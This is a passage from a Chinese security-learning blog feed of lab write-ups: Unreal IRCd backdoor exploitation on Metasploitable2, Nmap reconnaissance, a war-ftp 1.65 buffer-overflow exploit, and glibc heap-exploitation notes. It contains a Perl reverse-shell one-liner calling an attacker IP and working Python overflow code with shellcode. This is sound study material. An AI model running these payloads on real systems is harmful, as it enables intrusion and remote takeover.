class="hljs-keyword">system</span>($system); <span class="hljs-keyword">close</span>(STDIN); <span class="hljs-keyword">close</span>(STDOUT); <span class="hljs-keyword">close</span>(STDERR); &#125; <br></code></pre></td></tr></table></figure><h4 id="修改-Unreal-IRCD-3-2-8-1-exploit"><a href="#修改-Unreal-IRCD-3-2-8-1-exploit" class="headerlink" title="修改 Unreal IRCD 3.2.8.1 exploit"></a>修改 Unreal IRCD 3.2.8.1 exploit</h4><p>因为我们不能控制它下载了一个什么payload，所以我们可以修改payload以取得有效控制：</p><ol><li>使用 msfvenom 生成一个 reverse shell payload。</li><li>修改 exploit 代码。</li><li>使用 Netcat 获取一个 reverse shell。</li></ol><p>当前的 Perl 脚本的一个主要缺点是，它依赖于成功的利用及执行 wget 命令才能成功下载。因此，如果 wget 命令不在目标主机上，则会利用失败。下面将使用 msfvenom 生成一个 Perl 脚本的 payload 摆脱这种依赖和不可控性。命令如下：</p><p>msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;192.168.52.134 LPORT&#x3D;4444 -f raw</p><p><img src="/%5Cimages%5Cmetasploitable2-4.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">perl</span> -MIO -e <span class="hljs-string">&#x27;<span class="hljs-variable">$p</span>=fork;exit,if(<span class="hljs-variable">$p</span>);foreach my <span class="hljs-variable">$key</span>(keys %ENV)&#123;if(<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=~/(.*)/)&#123;<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=<span class="hljs-variable">$1</span>;&#125;&#125;<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,&quot;192.168.52.134:4444&quot;);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);while(&lt;&gt;)&#123;if(<span class="hljs-variable">$_</span>=~ /(.*)/)&#123;system <span class="hljs-variable">$1</span>;&#125;&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p>替换掉原本的payload，注意单引号用反斜线转义。</p><p>然后使用Netcat开启一个侦听：nc -lvp 4444</p><p>然后执行exploit：perl 13853.pl [target IP] [port] 1</p><p>我们就获取一个反向shell，并且是root权限：</p><p><img src="/%5Cimages%5Cmetasploitable2-5.png"></p><h3 id="Metasploit-Unreal-IRCD-3-2-8-1-漏洞自动利用"><a href="#Metasploit-Unreal-IRCD-3-2-8-1-漏洞自动利用" class="headerlink" title="Metasploit  Unreal IRCD 3.2.8.1 漏洞自动利用"></a>Metasploit  Unreal IRCD 3.2.8.1 漏洞自动利用</h3><p>启动 msfconsole ，并搜索 Unreal IRCD 相关利用模块：</p><p><img src="/%5Cimages%5Cmetasploitable2-6.png"></p><p>使用选中模块：use exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor</p><p>查看可用 payloads ： show payloads</p><p><img src="/%5Cimages%5Cmetasploitable2-7.png"></p><p>选一个payload：set payload cmd&#x2F;unix&#x2F;reverse_perl</p><p>查看并配置相关选项：</p><p>show options<br>set rhost [target ip]<br>set lhost [attack ip]</p><p><img src="/%5Cimages%5Cmetasploitable2-8.png"></p><p>最后执行exploit：run</p><p><img src="/%5Cimages%5Cmetasploitable2-9.png"></p><p>成功获取到了一个root权限的shell！</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Metasploitable2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透练习-信息收集</title>
    <link href="/blog/2020/04/24/%E6%B8%97%E9%80%8F%E7%BB%83%E4%B9%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/blog/2020/04/24/%E6%B8%97%E9%80%8F%E7%BB%83%E4%B9%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p><strong>最近喜欢上了使用msf来发现并利用一些漏洞，作为深入了解该类漏洞及其防御方法的入门兴趣开始叭，首先从信息收集开始学习。</strong></p><p><img src="/%5Cimages%5Cfj43.jpg"></p><span id="more"></span><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Nmap  （网络映射器）是Gordon Lyon最初编写的一种安全扫描器，用于发现计算机网络上的主机和服务，从而创建网络的“映射”。为了实现其目标，Nmap将特定数据包发送到目标主机，然后分析响应.NMAP强大的网络工具，用于枚举和测试网络。</p><p>NMAP的功能包括：</p><ul><li><p>主机发现 - 识别网络上的主机。例如，列出响应TCP和&#x2F;或ICMP请求或打开特定端口的主机。</p></li><li><p>端口扫描 - 枚举目标主机上的开放端口。</p></li><li><p>版本检测 - 询问远程设备上的网络服务以确定应用程序名称和版本号。</p></li><li><p>OS检测 - 确定网络设备的操作系统和硬件特性。</p></li><li><p>可与脚本进行脚本交互 - 使用Nmap脚本引擎（NSE）和Lua编程语言。</p></li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol><li>纯扫描：nmap &lt;目标IP地址&gt;</li><li>普通扫描增加输出冗长：nmap -vv  &lt;目标IP地址&gt;</li><li>自定义端口扫描：-p（范围）&lt;目标IP&gt;</li><li>指定端口扫描：nmap -p（port1，port2，port3等…）&lt;目标IP&gt;</li><li>执行ping：nmap -sP &lt;目标IP地址或者网段&gt;</li><li>跟踪路由用于检测您的计算机数据包从路由器到ISP的路由到互联网直至其特定目的地： nmap –traceroute &lt;ip地址&gt;</li><li>操作系统检测：nmap -O &lt;目标IP地址&gt;  </li><li>nmap万能开关：  nmap -A  &lt;目标IP地址&gt;</li><li>列出指定网络上的每台主机的，不会向目标主机发送任何报文。端口扫描、操作系统探测或者ping扫描，在该命令下不会被执行：nmap -sL &lt;网段&gt;，用-P0选项会使Nmap对每一个指定的目标IP地址进行所要求的扫描</li><li>-PS [portlist] (TCP SYN Ping)<br>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指<br>定。甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)，在这种情况下，每个端口会被并发地扫描。</li><li>-PA [portlist] (TCP ACK Ping)<br>TCP ACK ping和刚才讨论的-PS参数类似。不过选择-PA向目标发送的是ACK标志位而不是SYN。如果客户端向目标主机知识发送一个标志位为ACK的数据包，那么服务器就有理由认为这个数据包出问题，并回复一个RST的报文。</li><li>-PU [portlist] (UDP ping)<br>发送一个空的的 UDP报文到给定的端口(默认是31338)。如果目标主机的端口是关闭的话，UDP探测马上得到一个ICMP端口无法达到的回应报文。<br>这时，说明目标主机开启。而出现例如：TTL超时则表示该主机未开启。同时，这种方式可以绕过过滤以TCP方式探测的包。</li><li>-PR(ARP Ping)<br>基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件 地址(ARP)，这样它才能把以太帧送往正确的地址。</li><li>nmap -sS<br>SYN 扫描，半连接，受到syn&#x2F;ack响应后意味着端口开放，收到rst包意味着端口关闭。</li><li>sV:版本检测(sV) 版本检测是用来扫描目标主机和端口上运行的软件的版本</li><li>sudo nmap -p- -v -sS -sV -n 目标地址 –open -oX test.xml   扫描并导出</li></ol><h2 id="各种查询"><a href="#各种查询" class="headerlink" title="各种查询"></a>各种查询</h2><p><strong>Whois查询：</strong>使用vpn可以访问：<a href="https://www.yougetsignal.com/">https://www.yougetsignal.com/</a></p><p>除了这个还有其他的国内的，比如站长之家，爱站这两个。</p><p><strong>查询IP地址：</strong>国内的很多，常用ip138和ipip 这两个站，国外的话，用的ipinfo.io比较多</p><p><strong>查询备案信息：</strong>　　</p><p><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br><a href="https://www.qichacha.com/">https://www.qichacha.com/</a>　　企查查<br><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a>　　天眼查<br><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a>　　国家企业信用信息公示系统</p><p><strong>搜索引擎查找敏感信息：</strong></p><p>site:xxx.xxx admin</p><p>site:xxx.xxx login </p><p>site:xxx.xxx system</p><p><strong>使用 Exploit-db 评估漏洞</strong><br>Exploit-db 是一个非常好的，查找已知漏洞的地方。它为我们提供了大量的漏洞利用细节，详细说明文档，shellcodes 等重要信息资源。我们可以使用关键字 CVE 或 OSVDB 来进行相关的查找工作</p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><strong>CVE Databases</strong><br>另一个非常优秀的漏洞信息查询库是  CVE database  我们可以到以下链接进行查询：<br><a href="https://cve.mitre.org/cve/cve.html">https://cve.mitre.org/cve/cve.html</a></p><p><strong>Kali Linux 下的 Searchsploit</strong></p><p>searchsploit [服务名称]</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出漏洞实战</title>
    <link href="/blog/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/"/>
    <url>/blog/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p><strong>记一个缓冲区溢出漏洞原理与利用的过程，加深对缓冲区溢出漏洞的理解，学习缓冲区溢出漏洞的防范方式。</strong></p><p><img src="/%5Cimages%5Cfj42.jpg"></p><span id="more"></span><h2 id="搭建Windows10-FTP服务器"><a href="#搭建Windows10-FTP服务器" class="headerlink" title="搭建Windows10 FTP服务器"></a>搭建Windows10 FTP服务器</h2><p>控制面板，程序与功能，选择启用或关闭Windows功能，在IIS中选择下列内容</p><p><img src="/%5Cimages%5Cftp.png"></p><p>确定之后等待几分钟Windows自动配置</p><p>然后进入开始面板，找到Windows管理工具，里面有个IIS管理器，打开：</p><p><img src="/%5Cimages%5Cftp1.png"></p><p>在左侧选择新建FTP站点，如下图：</p><p><img src="/%5Cimages%5Cftp2.png"></p><p>填写站点信息：</p><p><img src="/%5Cimages%5Cftp3.png"></p><p>配置IP和端口：</p><p><img src="/%5Cimages%5Cftp4.png"></p><p>配置权限：</p><p><img src="/%5Cimages%5Cftp5.png"></p><p>xp虚拟机访问：</p><p><img src="/%5Cimages%5Cftp6.png"></p><h2 id="war-ftp-1-65"><a href="#war-ftp-1-65" class="headerlink" title="war-ftp 1.65"></a>war-ftp 1.65</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li><p>ollydbg</p></li><li><p>war-ftp 1.65</p></li><li><p>Windows 10</p></li><li><p>Windows xp sp1</p></li><li><p>VC++6.0</p></li><li><p>python 3.7.2</p></li></ul><h3 id="使用ollydbg打开程序"><a href="#使用ollydbg打开程序" class="headerlink" title="使用ollydbg打开程序"></a>使用ollydbg打开程序</h3><p><img src="/images/clip_image002.jpg"></p><p>然后点击开始运行，出现下面的界面：</p><p><img src="/images/clip_image004.jpg"></p><p>允许匿名登录，点击那个最左边的黄色闪电符号开启服务</p><p><img src="/images/clip_image006.jpg"></p><h3 id="编写测试溢出的代码"><a href="#编写测试溢出的代码" class="headerlink" title="编写测试溢出的代码"></a>编写测试溢出的代码</h3><p>根据ppt内容，我们可以知道，漏洞是在向服务器发送超过480字节的用户名可以触发漏洞（即使用命令USER longString\r\n），溢出之后，ESP中的内容包含了longString中的部分内容。</p><p>编写python脚本，链接ftp服务：</p><p><img src="/images/clip_image008.jpg"></p><p>运行之后可以看到xp虚拟机中的程序已经崩溃了，查看ollydbg，我们可以看出EIP的值已经改变，编程41414141，也就是A的ascii码，证明确实有溢出漏洞。</p><p><img src="/images/clip_image010.jpg"></p><h3 id="确定溢出点"><a href="#确定溢出点" class="headerlink" title="确定溢出点"></a>确定溢出点</h3><p>ppt上面说是超过480，那么我们先用480试试</p><p><img src="/images/clip_image011.png"></p><p><img src="/images/clip_image013.jpg"></p><p>我们发现EIP变成了43434343也就是字符C，我们进一步确定溢出点应该是在486到490之间，继续细化：</p><p><img src="/images/clip_image014.png"></p><p><img src="/images/clip_image016.jpg"></p><p>我们可以看到EIP变成了45444342 即EDCB,因此溢出位置应该是在486-489</p><h3 id="查找JMP-ESP指令地址"><a href="#查找JMP-ESP指令地址" class="headerlink" title="查找JMP ESP指令地址"></a>查找JMP ESP指令地址</h3><p>如果选择 ESP 为跳转的寄存器，则需要 JMP ESP 的指令地址，在中文 Windows 系统核心 dll 中查找，  找到XP kernel32.dll 的 JMP ESP:<strong>0x77fb59cc</strong> ，此外可以使用中文 WIN 2K&#x2F;XP&#x2F;2003 下通用的 JMP ESP ： <strong>0x7ffa4512</strong></p><p><img src="/images/clip_image018.jpg"></p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">getJmpEsp</span><span class="hljs-params">(TCHAR *ucDllName)</span><br>&#123;<br>    HINSTANCE h;<br>     <br>    h = GetModuleHandle(ucDllName);  <span class="hljs-comment">//从当前进程获得dll的起始位置</span><br>    <span class="hljs-keyword">if</span>(h == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        h = LoadLibrary(ucDllName); <span class="hljs-comment">//若当前进程没有导入dll 则加载dll 到当前进程，并且记录起始位置</span><br>        <span class="hljs-keyword">if</span>(h == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;ucDllName&lt;&lt;<span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    BYTE* ptr=(BYTE*)h;<br>    <span class="hljs-type">bool</span> done=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> y=<span class="hljs-number">0</span>;!done;y++)<br>    &#123;<br>        try<br>        &#123;<br>            <span class="hljs-keyword">if</span>(ptr[y] == <span class="hljs-number">0xFF</span> &amp;&amp; ptr[y+<span class="hljs-number">1</span>] == <span class="hljs-number">0xE4</span>)  <span class="hljs-comment">// jmp esp对应的机器码 为FF E4, 进行查找</span><br>            &#123;<br>                <span class="hljs-type">int</span> pos=(<span class="hljs-type">int</span>)ptr + y;  <span class="hljs-comment">//找到jmp esp地址后，则加上起始地址，为jmp esp 在内存的绝对地址</span><br>                <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//输出jmp esp的地址</span><br>            &#125;<br>        &#125;catch(...)<br>        &#123;<br>            <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;END OF &quot;</span>&lt;&lt;ucDllName&lt;&lt;<span class="hljs-string">&quot; MEMORY REACHED&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>            done=<span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    FreeLibrary(h);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    getJmpEsp(<span class="hljs-string">&quot;ntdll&quot;</span>);  <span class="hljs-comment">//从ntdll.dll 查找jmp esp地址</span><br>    getJmpEsp(<span class="hljs-string">&quot;kernel32&quot;</span>); <span class="hljs-comment">//从kernel32.dll 查找jmp esp地址</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="构造攻击代码"><a href="#构造攻击代码" class="headerlink" title="构造攻击代码"></a>构造攻击代码</h3><p><img src="/images/clip_image020.png"></p><p>构造的攻击字串如图所示。</p><p>这里我们构造一个简单的shellcode简单验证一下原理：</p><p>构造shellcode使目标机运行cmd</p><p>查找WinExec的地址，ctrl+G输入WinExec即可：</p><p><img src="/images/clip_image022.jpg"></p><p>我们可以看到WinExec在我的xp虚拟机中的地址是77e4fd35</p><p>构造出来的payload：</p><p><img src="/images/clip_image023.png"></p><p>执行使用payload进行登录：</p><p><img src="/images/clip_image025.jpg"></p><p>成功执行了目标机的CMD。</p><p>后面可以去网上找一些比较功能完善的shellcode，比如创建一个系统管理员用户等。</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> FTP<br>ftp = FTP(<span class="hljs-string">&#x27;192.168.52.143&#x27;</span>)<br><span class="hljs-comment">#ftp.login(&#x27;A&#x27; * 500, &#x27;www&#x27;)</span><br><span class="hljs-comment">#ftp.login(&#x27;A&#x27; * 480+&#x27;B&#x27;*5+&#x27;C&#x27;*5, &#x27;www&#x27;)</span><br>buf = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">485</span> + <span class="hljs-string">&#x27;\xcc\x59\xfb\x77&#x27;</span> + <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">4</span><br>buf += <span class="hljs-string">&quot;\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45&quot;</span><br>buf += <span class="hljs-string">&quot;\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6&quot;</span><br>buf += <span class="hljs-string">&quot;\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78&quot;</span><br>buf += <span class="hljs-string">&quot;\xC6\x45\xFE\x65\x6A\x01\x8D\x45\xF8\x50\xBA&quot;</span><br>buf += <span class="hljs-string">&quot;\x35\xfd\xe4\x77&quot;</span><br>buf += <span class="hljs-string">&quot;\xFF\xD2\xC9&quot;</span><br>ftp.login(buf, <span class="hljs-string">&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><p>从代码编写的角度来说，对于缓冲区的操作要进行严格的边界检查，这可借助一些工具如编译器来实现，像这次实践的 war-ftp 1.65 就应该对用户名数组边界进行检测；从运行状态来看，可进行动态保护，主要是数组边界检查和保证返回指针的完整性；从开发语言来看可使用安全的函数检测输入是否越界; 此外还可以从系统的角度阻止攻击代码的执行，例如非执行的缓冲区技术。对于操作系统而言， Windows 从 XP SP2 引入的 DEP(Data Execution Prevention) 即“数据执行保护”，一直延续到此后的 Windows Server 2003 、 Windows Server 2008 中，后者的 Address Space Load Randomization 让缓冲区溢出攻击变得非常困难，在 Windows 7 中， DEP 默认是激活的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>how2heap堆溢出利用练习</title>
    <link href="/blog/2020/04/15/how2heap%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/"/>
    <url>/blog/2020/04/15/how2heap%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>软件安全课上完后为了深入了解一下堆栈溢出漏洞及其利用方式，就去尝试了一下how2heap，写篇博客记录一下以后还能翻翻看看。</strong></p><p><img src="/%5Cimages%5Cfj41.jpg"></p><span id="more"></span><h2 id="0x00准备环境"><a href="#0x00准备环境" class="headerlink" title="0x00准备环境"></a>0x00准备环境</h2><p>下载代码练习包：<a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p><p>查看自己Linux主机glibc的版本，Ubuntu16应该是libc-2.23，可以在&#x2F;lib&#x2F;x86_64-linux-gnu目录下查找libc-2.xx即可看出来自己的glibc版本。由于我只做了how2heap的glibc2.25所以可以不用配置更高版本的glibc，如果想做glibc2.26就要自己配置一下glibc了，具体可以去网上找教程，很多。</p><p>解压之后进入主目录下有个makefile，所以我们直接make一下就可以编译好所有的文件。</p><h2 id="0x01malloc基础介绍"><a href="#0x01malloc基础介绍" class="headerlink" title="0x01malloc基础介绍"></a>0x01malloc基础介绍</h2><h3 id="0）-fastbin"><a href="#0）-fastbin" class="headerlink" title="0） fastbin"></a>0） fastbin</h3><p>fastbin是保存一些较小堆（32位系统默认不超过64字节，64位系统默认不超过128字节）的单链表结构。由于fastbin中相同index链接的都是相同大小的堆，ptmalloc认为不同位置的相同大小的堆没有区别，因此fastbin使用lifo的方法实现，即新释放的堆被链接到fastbin的头部，从fastbin中申请堆也是从头部取，这样就省去了一次遍历单链表的过程。fastbin的内存分配策略是exact fit，即只释放fastbin中跟申请内存大小恰好相等的堆。</p><h3 id="1）-smallbin"><a href="#1）-smallbin" class="headerlink" title="1） smallbin"></a>1） smallbin</h3><p>smallbin中包含62个循环双向链表，链表中chunk的大小与index的关系是2 size_t index。由于smallbin是循环双向链表，所以它的实现方法是fifo；smallbin的内存分配策略是exact fit。<br>从实现中可以看出smallbin链接的chunk中包含一部分fastbin大小的堆，fastbin范围的堆是有可能被链入其他链表的。当用户申请smallbin大小的堆而smallbin又没有初始化或者申请大于smallbin最大大小的堆时，fastbin中的堆根据prev_inuse位进行合并后会进入如上unsortedbin的处理流程，符合smallbin或largebin范围的堆会被链入相应的链表。<br>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。每个small bin也是一个由对应free chunk组成的循环双链表。第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 61*8 &#x3D; 508字节。</p><h3 id="2）-Largebin"><a href="#2）-Largebin" class="headerlink" title="2） Largebin"></a>2） Largebin</h3><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。<br>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行从大到小的排列：最大的chunk放在链表的front end，最小的chunk放在rear end。<br>largebin包含63个循环双向链表，每个链表链接的都是一定范围大小的堆，链表中堆的大小按从大到小排序，堆结构体中的fd_nextsize和bk_nextsize字段标识链表中相邻largechunk的大小，即fd_nextsize标识比它小的堆块、bk_nextsize标识比它大的堆块。</p><p>对于相同大小的堆，释放的堆插入到bin头部，通过fd、bk与其他的堆链接形成循环双向链表。</p><p>Largebin的分配策略是best fit，即最终取出的堆是符合申请内存的最小堆（记为chunk）。若取出的chunk比申请内存大至少minsize，则分割chunk并取合适大小的剩余堆做为last remainder；若取出的chunk比申请内存不大于minsize，则不分割chunk直接返回做为用户申请内存块。</p><h3 id="3）-unsortedbin"><a href="#3）-unsortedbin" class="headerlink" title="3） unsortedbin"></a>3） unsortedbin</h3><p>unsortedbin可以视为空闲chunk回归其所属bin之前的缓冲区，分配策略是exact fit。可能会被链入unsortedbin的堆块是申请largebin大小堆块切割后的last remainder；释放不属于fastbin大小且不与topchunk紧邻的堆块时会被先链入unsortedbin；在特定情况下将fastbin内的堆合并后会进入unsortedbin的处理流程（特定情况为申请fastbin范围堆fastbin为空；申请非fastbin范围smallbin的堆但smallbin未初始化；申请largechunk）</p><h2 id="0x02-Glibc2-25部分"><a href="#0x02-Glibc2-25部分" class="headerlink" title="0x02 Glibc2.25部分"></a>0x02 Glibc2.25部分</h2><h3 id="1-fastbin-dup-consolidate"><a href="#1-fastbin-dup-consolidate" class="headerlink" title="1.fastbin_dup_consolidate"></a>1.fastbin_dup_consolidate</h3><p>原理是利用申请一次largebin大小的堆会将fastbin的堆进行合并进入unsortedbin的处理流程，此时再次free fastbin中的堆会绕过free时对fastbin链表头节点的检查进而构成一次doublefree<br>free时只会检查释放fastbin大小的堆时被释放的堆是否和fastbin的头结点是否一致，而在申请0x400的largechunk时，fastbin链表非空，fastbin中的堆会进行合并，并且进入unsortedbin的处理流程，在unsortedbin的处理流程中符合fastbin大小的堆会被放入smallbin，这样就绕过了free时对fastbin头结点的检查，从而可以构成一次对fastbin大小的堆的doublefree。</p><p><img src="/%5Cimages%5Chow2heap1.png"></p><p><img src="/%5Cimages%5Chow2heap1-1.png"></p><h3 id="2-fastbin-dup-into-stack"><a href="#2-fastbin-dup-into-stack" class="headerlink" title="2.fastbin_dup_into_stack"></a>2.fastbin_dup_into_stack</h3><p>在doublefree时我们有一次申请一个存在于fastbin链表的堆的机会，然后通过伪造堆的内容可以使得fastbin链入伪造的堆，再次申请内存可以得到伪造地址处的堆。<br>示例中先申请了3个0x8大小的堆，然后通过free(a)、free(b)、free(a)构成一次doublefree，导致我们后续还可以申请到a处的位置进行重写。此时fastbin的连接状态是a-&gt;b-&gt;a。再次申请两个0x8大小的堆，由于fastbin的lifo，此时fastbin中只剩a，且此时堆a存在于fastbin和用户申请的堆中，即我们可以控制一个存在于fastbin的堆的内容。容易想到的一种利用方式是伪造fastbin链表的内容，进而达到在伪造地址处申请堆的效果。</p><p>示例中在栈中伪造了一个0x20大小的堆，此时堆a的fd指向&amp;stack_var，即fastbin:a-&gt;stack_var，此时第二次申请不超过0x18大小的堆即可返回栈地址处的伪造堆，第二次malloc分配的是伪造的块，我们可以写的地方是&amp;starck_var+8~&amp;stack_var+16。</p><p><img src="/%5Cimages%5Chow2heap2.png"></p><h3 id="3-unsafe-unlink"><a href="#3-unsafe-unlink" class="headerlink" title="3.unsafe_unlink"></a>3.unsafe_unlink</h3><p>这是在堆可以溢出到下一个堆的size域且存在一个指向堆的指针时堆溢出的一种利用方式。Unsafe unlink利用的前提是可以溢出到下一个堆的size域，利用的大致思路是在chunk0构造fakechunk且fakechunk可以绕过unlink双向链表断链的检查，修改chunk1的pre_size使之等于fakechunk的大小，修改chunk1中size域的prev inuse位为0以便free(chunk1)时检查前后向堆是否空闲时（这里是后向堆，即物理低地址）触发unlink双向链表断链构成一次任意地址写。<br>示例中首先申请了两个0x80大小的堆chunk0和chunk1（非fastbin大小，因为fastbin大小的堆为了避免合并pre_inuse总是为1），然后在chunk0中构造fake_chunk</p><p><img src="/%5Cimages%5Chow2heap3.png"></p><p>需要注意的是，我们构造的fake chunk的起点是chunk0的数据部分即fd，fake chunk的prev size和size域正常赋值即可（最新的libc加入了cur_chunk’size&#x3D;next_chunk’s prev_size），fake chunk中关键的部分是fake data，这一部分要绕过unlink双向链表断链的检查，即fd-&gt;bk&#x3D;p&amp;&amp;bk-&gt;fd&#x3D;p。</p><p>malloc_chunk结构体如下：</p><p><img src="/%5Cimages%5Chow2heap3-1.png"></p><p>所以由结构体的寻址方式可得</p><p>(fd-&gt;bk&#x3D;fd+3* size_t)&#x3D;p<br>(bk-&gt;fd&#x3D;bk+2* size_t)&#x3D;p</p><p>所以可得</p><p>fd&#x3D;p-3* size_t<br>bk&#x3D;p-2* size_t</p><p>即fakechunk中fd和bk域如上构造即可绕过unlink双向链表的断链检查。<br>构造完fakechunk还需要修改下chunk1的prevsize和size的数据</p><p>断链的过程：</p><p>fd-&gt;bk&#x3D;bk 即(fd-&gt;bk&#x3D;p)&#x3D;(bk&#x3D;p-2* size_t)</p><p>bk-&gt;fd&#x3D;fd 即(bk-&gt;fd&#x3D;p)&#x3D;(fd&#x3D;p-3* size_t)</p><p>最终相当于：</p><p>p&#x3D;p-3* size_t</p><p>即获得了两个相等的指针（struct malloc_chunk * 